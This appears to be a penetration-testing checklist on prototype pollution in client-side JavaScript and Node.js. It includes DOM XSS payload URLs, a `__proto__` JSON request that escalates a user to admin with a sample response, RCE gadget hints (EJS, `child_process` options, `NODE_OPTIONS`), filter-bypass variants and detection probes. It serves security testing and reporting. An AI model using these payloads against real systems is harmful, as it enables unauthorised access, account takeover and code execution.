# Prototype Pollution (Client & Server)

**What it is:** Attacker sets properties on `Object.prototype`. Every JS object inherits them → change app behavior globally. Client-side → DOM XSS/config override. Server-side (Node) → DoS, authZ bypass, RCE via gadget.

## Injection vectors
Keys `__proto__`, `constructor.prototype`, `constructor[prototype]`. Delivered via:
- URL query/hash: `?__proto__[x]=y`, `#a[constructor][prototype][x]=y`.
- JSON body merged by a vulnerable `merge`/`extend`/`clone`/`defaultsDeep`.
- Query parsers (`qs`), form data, YAML/config parse.

## Client-side (→ DOM XSS)
Pollute a property a sink reads (e.g. a library's `src`/`html`/config default):
```
https://target.com/?__proto__[srcdoc]=<img/src/onerror=alert(document.domain)>
https://target.com/#__proto__[transport_url]=data:,alert(document.domain)//
```
Steps:
- [ ] Add `?__proto__[ppcheck]=reflected` → open console → `Object.prototype.ppcheck` returns value = polluted.
- [ ] Find a gadget: a lib reading an undefined config prop from the prototype (Google Analytics, Wistia, embeds, sanitizer bypass).
- [ ] Chain gadget → XSS/redirect/CSP bypass.

## Server-side (Node.js)
```http
POST /api/profile HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=<mine>

{"name":"x","__proto__":{"isAdmin":true}}
```
If the app later checks `user.isAdmin` on a fresh object with no own `isAdmin`, it inherits `true` → privilege escalation.

Other server gadgets:
- DoS: pollute a prop that breaks every object (`{"__proto__":{"toString":0}}`).
- RCE: pollute options passed to `child_process`/template engine (`{"__proto__":{"shell":"...","argv0":"..."}}`) or EJS `outputFunctionName` gadget.
- authZ bypass: pollute a default permission/role flag.

## Detection
- Client: `constructor.prototype` gadget scanner, Burp **DOM Invader** (prototype-pollution mode), `ppmap`, PortSwigger's `pp-finder`.
- Server: send `{"__proto__":{"json spaces":10}}` type payloads and watch response formatting/behavior change; look for status/JSON-indent shifts.

## Impact
DOM XSS (ATO), server privilege escalation, DoS, RCE via gadget chain.

## 🎯 PoC — Request → Response (server-side, Node)

Vulnerable deep-merge on a profile update:
```http
POST /api/v2/account/preferences HTTP/2
Host: api.target.com
Authorization: Bearer <free-user>
Content-Type: application/json

{"theme":"dark","__proto__":{"isAdmin":true}}
```
```http
HTTP/2 200 OK
{"theme":"dark"}
```
Now a later authz check reads `user.isAdmin` off a fresh object with no own property → inherits `true`:
```http
GET /api/v2/admin/metrics HTTP/2
Host: api.target.com
Authorization: Bearer <free-user>
```
```http
HTTP/2 200 OK
{"revenue":1204551,"users":48201}      ← admin data to a free user = pollution → authz bypass
```
Detection tell: `{"__proto__":{"json spaces":10}}` → subsequent JSON responses become indented (Express reads the polluted `json spaces`).

## Deep cuts — vectors, gadgets, and filter bypass
- [ ] **`__proto__`-filtered? use `constructor.prototype`:** `?constructor[prototype][x]=y`, `constructor.prototype.x`, or nested `{"constructor":{"prototype":{"x":1}}}`; also `__proto__` with encoded/case/`[]` variants some sanitizers miss.
- [ ] **Vulnerable merge/parse functions:** Lodash `merge/mergeWith/set/setWith/defaultsDeep` (old), jQuery `$.extend(true,...)`, `Object.assign` misuse, `qs`/`querystring` deep-parse, `deep-extend`, `mixin-deep`, `set-value`, `JSON.parse` reviver, config/YAML loaders. Grep bundles for these.
- [ ] **Client gadgets (→ DOM XSS/CSP bypass):** known chains in jQuery (`$.get`/`load` `dataType`→script), Google Tag Manager/Analytics, Wistia, Vimeo/embed SDKs, Closure, sanitizer configs (`ALLOWED_ATTR`/`RETURN_TRUSTED_TYPE`), Chart.js, Swiper — pollute the default a lib reads when a prop is absent (PortSwigger gadget list).
- [ ] **Server gadgets (→ RCE/DoS/authz):** EJS `outputFunctionName`/`escapeFunction`, Pug/Jade `self`/`compileDebug`, Handlebars, Lodash `template`, `child_process` `spawn` options (`shell`,`env`,`NODE_OPTIONS`→`--require`), `Function`/`vm` options, Kibana/Parse-server historical RCEs. `NODE_OPTIONS=--require=/proc/self/...` is a strong prod gadget.
- [ ] **Blind server detection:** `{"__proto__":{"json spaces":10}}` (Express indents JSON), `{"__proto__":{"status":510}}`/`{"__proto__":{"exposedHeaders":[...] }}` behavior shifts, or a `parameterLimit`/`ignoreQueryPrefix` change → confirms pollution without a gadget.
- [ ] **Authz/logic bypass without RCE:** pollute a default-false flag (`isAdmin`, `verified`, `role`, `hasAccess`) that later code reads off an object lacking its own property (`04-auth-session/08` JSON fuzz).
- [ ] **Pollution → other bug:** polluted config feeds an `innerHTML`/`script.src` sink (XSS), a `require`/path (LFI), or an SSRF URL default.

## Report notes
Show the pollution taking effect (`Object.prototype.x` set, or the inherited flag changing a decision). For XSS, show the fired payload + the gadget path. Name the sink function and gadget.
